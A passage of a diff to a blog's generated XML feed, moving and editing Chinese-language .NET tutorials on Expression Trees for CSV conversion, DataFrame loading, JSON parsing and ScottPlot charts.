&quot;&quot; : t.Name.ToString()</span></span><br><span class="line">        ConditionalExpression ternary = Expression.Condition(isNull, constantEmpty, propertyToString);</span><br><span class="line"></span><br><span class="line">        parameters.Add(ternary);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取得 Format 方法</span></span><br><span class="line">    MethodInfo formatMethod = <span class="keyword">typeof</span>(<span class="built_in">string</span>).GetMethod(<span class="string">&quot;Format&quot;</span>, BindingFlags.Static | BindingFlags.Public, <span class="literal">null</span>, <span class="keyword">new</span>[] &#123; <span class="keyword">typeof</span>(<span class="built_in">string</span>), <span class="keyword">typeof</span>(<span class="built_in">object</span>[]) &#125;, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 產生類別欄位序號模板清單 [ &#123;0&#125;, &#123;1&#125; ]</span></span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; formatStrings = Enumerable.Range(<span class="number">0</span>, prop.Length).Select(count =&gt; <span class="string">$&quot;&#123;&#123;<span class="subst">&#123;count&#125;</span>&#125;&#125;&quot;</span>).ToList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用符號 | 串聯成字串 &quot;&#123;0&#125;|&#123;1&#125;&quot;</span></span><br><span class="line">    ConstantExpression formatConstantExpression = Expression.Constant(<span class="built_in">string</span>.Join(delimiter, formatStrings));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生類別欄位轉換陣列</span></span><br><span class="line">    NewArrayExpression formatObjsExpression = Expression.NewArrayInit(<span class="keyword">typeof</span>(<span class="built_in">string</span>), parameters);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生 lambda 表達式</span></span><br><span class="line">    Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt; lambda = (Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt;)Expression.Lambda(Expression.Call(formatMethod, formatConstantExpression, formatObjsExpression), t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t =&gt; Format(&quot;&#123;0&#125;|&#123;1&#125;&quot;, new [] &#123;IIF((t.Name == null), &quot;&quot;, t.Name.ToString()), IIF((t.Age.ToString() == null), &quot;&quot;, t.Age.ToString())&#125;)</span></span><br><span class="line"></span><br><span class="line">    IQueryable&lt;T&gt; queryable = list.AsQueryable();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queryable.Select(lambda).ToList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h1>
+<p>執行方法轉換出 CSV 列表</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;<span class="built_in">string</span>&gt; csvList = users.selectToCsv(<span class="string">&quot;|&quot;</span>);</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/advanced-topics/expression-trees/">Expression Trees</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>.Net</category>
+      </categories>
+      <tags>
+        <tag>.Net</tag>
+        <tag>Expression</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用 DataFrame 操作資料</title>
     <url>/2024/05/05/NetDataFrame/</url>
     <content><![CDATA[<h1 id="套件安裝"><a class="header-anchor" href="#套件安裝"></a>套件安裝</h1>
-<p>安裝套件 Microsoft.Data.Analysis</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta">#r &quot;nuget: Microsoft.Data.Analysis, 0.21.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.Analysis;</span><br></pre></td></tr></table></figure>
+<p>安裝套件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 套件 Microsoft.Data.Analysis 檔案轉 DataFrame 格式</span></span><br><span class="line"><span class="meta">#r &quot;nuget: Microsoft.Data.Analysis, 0.21.1&quot;</span></span><br></pre></td></tr></table></figure>
+<p>引用套件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.Analysis;</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 <h1 id="載入-CSV-資料"><a class="header-anchor" href="#載入-CSV-資料"></a>載入 CSV 資料</h1>
 <p>使用 LoadCsvFromString</p>
@@ -1595,34 +1649,6 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
-    <title>使用 Expression Trees 把 List&lt;T&gt; 轉成 CSV 字串</title>
-    <url>/2024/05/01/NetExpressionListToCsv/</url>
-    <content><![CDATA[<h1 id="宣告類別"><a class="header-anchor" href="#宣告類別"></a>宣告類別</h1>
-<p>類別內容如下</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>List 內容如下</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; users = <span class="keyword">new</span> List&lt;User&gt;&#123;</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test1&quot;</span>,</span><br><span class="line">        Age = <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test2&quot;</span>,</span><br><span class="line">        Age = <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="產生-Expression-表達式"><a class="header-anchor" href="#產生-Expression-表達式"></a>產生 Expression 表達式</h1>
-<p>建立轉換方法</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Linq.Expressions;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">List</span>&lt;<span class="title">string</span>&gt; <span class="title">selectToCsv</span>&lt;<span class="title">T</span>&gt;(<span class="params"><span class="keyword">this</span> List&lt;T&gt; list, <span class="built_in">string</span> delimiter</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Type source = <span class="keyword">typeof</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得類別欄位</span></span><br><span class="line">    PropertyInfo[] prop = source.GetProperties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 類別使用 t 表達 </span></span><br><span class="line">    ParameterExpression t = Expression.Parameter(source, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得轉成字串方法</span></span><br><span class="line">    MethodInfo toString = <span class="keyword">typeof</span>(<span class="built_in">object</span>).GetMethod(<span class="string">&quot;ToString&quot;</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ConditionalExpression&gt; parameters = <span class="keyword">new</span> List&lt;ConditionalExpression&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (PropertyInfo p <span class="keyword">in</span> prop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 類別欄位使用 t.Name, t.Age 表達</span></span><br><span class="line">        MemberExpression propertyValue = Expression.PropertyOrField(t, p.Name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位進行字串轉換 t.Name.ToString(), t.Age.ToString()</span></span><br><span class="line">        MethodCallExpression propertyToString = Expression.Call(propertyValue, toString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// NULL 值</span></span><br><span class="line">        ConstantExpression constantNull = Expression.Constant(<span class="literal">null</span>, <span class="keyword">typeof</span>(<span class="built_in">object</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位需進行字串轉換後，在做 NULL 判斷</span></span><br><span class="line">        BinaryExpression isNull = Expression.Equal(propertyToString, constantNull);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p.PropertyType == <span class="keyword">typeof</span>(<span class="built_in">string</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 字串型別欄位直接進行 NULL 判斷</span></span><br><span class="line">            isNull = Expression.Equal(propertyValue, constantNull);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空字串值</span></span><br><span class="line">        ConstantExpression constantEmpty = Expression.Constant(<span class="built_in">string</span>.Empty, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// IIF 判斷 t.Name == null ? &quot;&quot; : t.Name.ToString()</span></span><br><span class="line">        ConditionalExpression ternary = Expression.Condition(isNull, constantEmpty, propertyToString);</span><br><span class="line"></span><br><span class="line">        parameters.Add(ternary);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取得 Format 方法</span></span><br><span class="line">    MethodInfo formatMethod = <span class="keyword">typeof</span>(<span class="built_in">string</span>).GetMethod(<span class="string">&quot;Format&quot;</span>, BindingFlags.Static | BindingFlags.Public, <span class="literal">null</span>, <span class="keyword">new</span>[] &#123; <span class="keyword">typeof</span>(<span class="built_in">string</span>), <span class="keyword">typeof</span>(<span class="built_in">object</span>[]) &#125;, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 產生類別欄位序號模板清單 [ &#123;0&#125;, &#123;1&#125; ]</span></span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; formatStrings = Enumerable.Range(<span class="number">0</span>, prop.Length).Select(count =&gt; <span class="string">$&quot;&#123;&#123;<span class="subst">&#123;count&#125;</span>&#125;&#125;&quot;</span>).ToList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用符號 | 串聯成字串 &quot;&#123;0&#125;|&#123;1&#125;&quot;</span></span><br><span class="line">    ConstantExpression formatConstantExpression = Expression.Constant(<span class="built_in">string</span>.Join(delimiter, formatStrings));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生類別欄位轉換陣列</span></span><br><span class="line">    NewArrayExpression formatObjsExpression = Expression.NewArrayInit(<span class="keyword">typeof</span>(<span class="built_in">string</span>), parameters);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生 lambda 表達式</span></span><br><span class="line">    Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt; lambda = (Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt;)Expression.Lambda(Expression.Call(formatMethod, formatConstantExpression, formatObjsExpression), t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t =&gt; Format(&quot;&#123;0&#125;|&#123;1&#125;&quot;, new [] &#123;IIF((t.Name == null), &quot;&quot;, t.Name.ToString()), IIF((t.Age.ToString() == null), &quot;&quot;, t.Age.ToString())&#125;)</span></span><br><span class="line"></span><br><span class="line">    IQueryable&lt;T&gt; queryable = list.AsQueryable();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queryable.Select(lambda).ToList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h1>
-<p>執行方法轉換出 CSV 列表</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;<span class="built_in">string</span>&gt; csvList = users.selectToCsv(<span class="string">&quot;|&quot;</span>);</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/advanced-topics/expression-trees/">Expression Trees</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>Expression</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何解析 JSON 資料</title>
     <url>/2023/05/07/NetJsonParse/</url>
     <content><![CDATA[<h1 id="建立-JSON-檔案"><a class="header-anchor" href="#建立-JSON-檔案"></a>建立 JSON 檔案</h1>
@@ -1630,10 +1656,10 @@ dotnet-dump collect --process-id 1902 -->
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;town&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Belgrade&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;town&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Paris&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;town&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Madrid&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <span id="more"></span>
 <h1 id="建立-Class-對應"><a class="header-anchor" href="#建立-Class-對應"></a>建立 Class 對應</h1>
-<p>Class 內容如下</p>
+<p>建立檔案 Request.cs 內容如下</p>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Address</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="string">&quot;town&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Town &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Info</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="string">&quot;address&quot;</span>)</span>]</span><br><span class="line">	<span class="keyword">public</span> List&lt;Address&gt; Address &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Request</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="string">&quot;info&quot;</span>)</span>]</span><br><span class="line">	<span class="keyword">public</span> Info Info &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <h1 id="讀取資料並解析"><a class="header-anchor" href="#讀取資料並解析"></a>讀取資料並解析</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!import Request.cs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Text.Json;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> (StreamReader r = <span class="keyword">new</span> StreamReader(<span class="string">@&quot;.\Request.json&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 讀取整個檔案</span></span><br><span class="line">	<span class="built_in">string</span> jsonString = r.ReadToEnd();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 還原序列化成 Request 類別</span></span><br><span class="line">	Request req = JsonSerializer.Deserialize&lt;Request&gt;(jsonString);</span><br><span class="line"></span><br><span class="line">	req.Display();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 序列化 Request 類別成 JSON 字串</span></span><br><span class="line">	<span class="built_in">string</span> reqString = JsonSerializer.Serialize&lt;Request&gt;(req);</span><br><span class="line"></span><br><span class="line">    reqString.Display();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引用 Request.cs</span></span><br><span class="line"><span class="meta">#!import Request.cs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Text.Json;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> (StreamReader r = <span class="keyword">new</span> StreamReader(<span class="string">@&quot;.\Request.json&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 讀取整個檔案</span></span><br><span class="line">	<span class="built_in">string</span> jsonString = r.ReadToEnd();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 還原序列化成 Request 類別</span></span><br><span class="line">	Request req = JsonSerializer.Deserialize&lt;Request&gt;(jsonString);</span><br><span class="line"></span><br><span class="line">	req.Display();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 序列化 Request 類別成 JSON 字串</span></span><br><span class="line">	<span class="built_in">string</span> reqString = JsonSerializer.Serialize&lt;Request&gt;(req);</span><br><span class="line"></span><br><span class="line">    reqString.Display();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
 <li><a href="https://learn.microsoft.com/zh-tw/dotnet/standard/serialization/system-text-json/how-to">如何寫入 .NET 物件成為 JSON (序列化)</a></li>
@@ -1730,50 +1756,6 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
-    <title>使用 ScottPlot 繪製圖表</title>
-    <url>/2024/06/01/NetScottPlot/</url>
-    <content><![CDATA[<h1 id="初始化設定"><a class="header-anchor" href="#初始化設定"></a>初始化設定</h1>
-<p>安裝套件</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 套件 Microsoft.Data.Analysis 檔案轉 DataFrame 格式</span></span><br><span class="line"><span class="meta">#r &quot;nuget: Microsoft.Data.Analysis, 0.21.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 套件 ScottPlot 產生圖片</span></span><br><span class="line"><span class="meta">#r &quot;nuget:ScottPlot, 5.0.*&quot;</span></span><br></pre></td></tr></table></figure>
-<p>引用套件</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.Analysis;</span><br><span class="line"><span class="keyword">using</span> ScottPlot;</span><br><span class="line"><span class="keyword">using</span> ScottPlot.Plottables;</span><br><span class="line"><span class="keyword">using</span> ScottPlot.Statistics;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 ScottPlot 圖片格式</span></span><br><span class="line"><span class="keyword">using</span> Microsoft.DotNet.Interactive.Formatting;</span><br><span class="line">Formatter.Register(<span class="keyword">typeof</span>(ScottPlot.Plot), (p, w) =&gt; </span><br><span class="line">    w.Write(((ScottPlot.Plot)p).GetPngHtml(<span class="number">400</span>, <span class="number">300</span>)), HtmlFormatter.MimeType);</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="載入-CSV-資料"><a class="header-anchor" href="#載入-CSV-資料"></a>載入 CSV 資料</h1>
-<p>可參考這篇 <a href="/2024/05/05/NetDataFrame/" title="使用 DataFrame 操作資料">DataFrame</a> 載入 <a href="test.csv">📥 CSV 資料</a></p>
-<h1 id="建立擴充方法"><a class="header-anchor" href="#建立擴充方法"></a>建立擴充方法</h1>
-<p>使用此擴充方法取得特定 Column 資料</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">double</span>[] <span class="title">GetColumn</span>(<span class="params"><span class="keyword">this</span> DataFrame df, <span class="built_in">string</span> column</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> Enumerable.Range(<span class="number">0</span>, (<span class="built_in">int</span>)df.Rows.Count).Select(x =&gt; Convert.ToDouble(df[column][x])).ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="使用-SignalXY-繪圖"><a class="header-anchor" href="#使用-SignalXY-繪圖"></a>使用 SignalXY 繪圖</h1>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 計算資料筆數</span></span><br><span class="line"><span class="built_in">int</span>[] rowIndex = Enumerable.Range(<span class="number">0</span>, (<span class="built_in">int</span>)df.Rows.Count).ToArray();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Duration 欄</span></span><br><span class="line"><span class="built_in">double</span>[] durationsY = df.GetColumn(<span class="string">&quot;Duration&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll1 = myPlot.Add.SignalXY(rowIndex, durationsY);</span><br><span class="line">sigAll1.LegendText = <span class="string">&quot;Duration&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Pulse 欄</span></span><br><span class="line"><span class="built_in">double</span>[] pulseY = df.GetColumn(<span class="string">&quot;Pulse&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll2 = myPlot.Add.SignalXY(rowIndex, pulseY);</span><br><span class="line">sigAll2.LegendText = <span class="string">&quot;Pulse&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Maxpulse 欄</span></span><br><span class="line"><span class="built_in">double</span>[] maxpulseY = df.GetColumn(<span class="string">&quot;Maxpulse&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll3 = myPlot.Add.SignalXY(rowIndex, maxpulseY);</span><br><span class="line">sigAll3.LegendText = <span class="string">&quot;Maxpulse&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Calories 欄</span></span><br><span class="line"><span class="built_in">double</span>[] caloriesY = df.GetColumn(<span class="string">&quot;Calories&quot;</span>);</span><br><span class="line"></span><br><span class="line">SignalXY sigAll4 = myPlot.Add.SignalXY(rowIndex, caloriesY);</span><br><span class="line">sigAll4.LegendText = <span class="string">&quot;Calories&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Legend 位置</span></span><br><span class="line">myPlot.Legend.Alignment = ScottPlot.Alignment.UpperRight;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
-<!-- myPlot1.GetImage(400, 300).SaveWebp("SignalXY.webp"); -->
-<p><img src="SignalXY.webp" alt="SignalXY"></p>
-<h1 id="使用-Scatter-繪圖，分析關聯性"><a class="header-anchor" href="#使用-Scatter-繪圖，分析關聯性"></a>使用 Scatter 繪圖，分析關聯性</h1>
-<p>使用「Duration」作為 x 軸，使用「Calories」作為 y 軸</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Scatter</span></span><br><span class="line">Scatter scatter = myPlot.Add.Scatter(durationsY, caloriesY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除線條</span></span><br><span class="line">scatter.LineWidth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
-<p><img src="Scatter1.webp" alt="Scatter1"></p>
-<p>使用「Duration」作為 x 軸，使用「Maxpulse」作為 y 軸</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Scatter</span></span><br><span class="line">Scatter scatter = myPlot.Add.Scatter(durationsY, maxpulseY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除線條</span></span><br><span class="line">scatter.LineWidth = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
-<p><img src="Scatter2.webp" alt="Scatter2"></p>
-<h1 id="使用-Bars-繪圖，分析-Duration-頻率"><a class="header-anchor" href="#使用-Bars-繪圖，分析-Duration-頻率"></a>使用 Bars 繪圖，分析 Duration 頻率</h1>
-<p>分析 Duration 資料分佈狀態</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Plot myPlot = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 載入 Duration 欄</span></span><br><span class="line"><span class="built_in">double</span>[] durationsY = df.GetColumn(<span class="string">&quot;Duration&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直方圖分箱數</span></span><br><span class="line"><span class="built_in">int</span> binCount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 獲取直方圖數據</span></span><br><span class="line">ScottPlot.Statistics.Histogram hist = ScottPlot.Statistics.Histogram.WithBinCount(binCount, durationsY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Bars</span></span><br><span class="line">BarPlot bar = myPlot.Add.Bars(hist.Bins, hist.GetProbability());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Y 軸刻度</span></span><br><span class="line">myPlot.Axes.Left.TickGenerator = <span class="keyword">new</span> ScottPlot.TickGenerators.NumericFixedInterval(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 設定 Bars 的顏色與寬度</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">var</span> bar <span class="keyword">in</span> bar.Bars)</span><br><span class="line">&#123;</span><br><span class="line">    bar.LineColor = ScottPlot.Color.FromColor(System.Drawing.Color.Blue);</span><br><span class="line">    bar.LineWidth = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">//bar.Size = hist.FirstBinSize * 0.8;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 繪製機率曲線</span></span><br><span class="line">ProbabilityDensity pd = <span class="keyword">new</span>(durationsY);</span><br><span class="line"><span class="built_in">double</span>[] xs = Generate.Range(durationsY.Min(), durationsY.Max(), <span class="number">1</span>);</span><br><span class="line"><span class="built_in">double</span> sumBins = hist.Bins.Select(x =&gt; pd.GetY(x)).Sum();</span><br><span class="line"><span class="built_in">double</span>[] ys = pd.GetYs(xs, <span class="number">1.0</span> / sumBins);</span><br><span class="line"></span><br><span class="line">Scatter curve = myPlot.Add.ScatterLine(xs, ys);</span><br><span class="line">curve.LineWidth = <span class="number">2</span>;</span><br><span class="line">curve.LineColor = Colors.Black;</span><br><span class="line">curve.LinePattern = LinePattern.DenselyDashed;</span><br><span class="line"></span><br><span class="line">myPlot.Axes.Margins(bottom: <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 顯示圖表</span></span><br><span class="line">myPlot</span><br></pre></td></tr></table></figure>
-<p><img src="Histogram.webp" alt="Histogram"></p>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://scottplot.net/quickstart/notebook/">scottplot</a></li>
-<li><a href="https://www.w3schools.com/python/pandas/pandas_plotting.asp">pandas plotting</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>.Net</tag>
-        <tag>Polyglot Notebooks</tag>
-        <tag>ScottPlot</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何在商業邏輯層進行單元測試</title>
     <url>/2022/05/01/NetServiceUnitTest/</url>
     <content><![CDATA[<h1 id="安裝-NSubstitute"><a class="header-anchor" href="#安裝-NSubstitute"></a>安裝 NSubstitute</h1>
@@ -1812,6 +1794,53 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
+    <title>使用 ScottPlot 繪製圖表</title>
+    <url>/2024/06/01/NetScottPlot/</url>
+    <content><![CDATA[<h1 id="初始化設定"><a class="header-anchor" href="#初始化設定"></a>初始化設定</h1>
+<p>安裝套件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 套件 Microsoft.Data.Analysis 檔案轉 DataFrame 格式</span></span><br><span class="line"><span class="meta">#r &quot;nuget: Microsoft.Data.Analysis, 0.21.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 套件 ScottPlot 產生圖片</span></span><br><span class="line"><span class="meta">#r &quot;nuget:ScottPlot, 5.0.*&quot;</span></span><br></pre></td></tr></table></figure>
+<p>引用套件</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.Analysis;</span><br><span class="line"><span class="keyword">using</span> ScottPlot;</span><br><span class="line"><span class="keyword">using</span> ScottPlot.Plottables;</span><br><span class="line"><span class="keyword">using</span> ScottPlot.Statistics;</span><br></pre></td></tr></table></figure>
+<p>設定 ScottPlot 圖片格式</p>
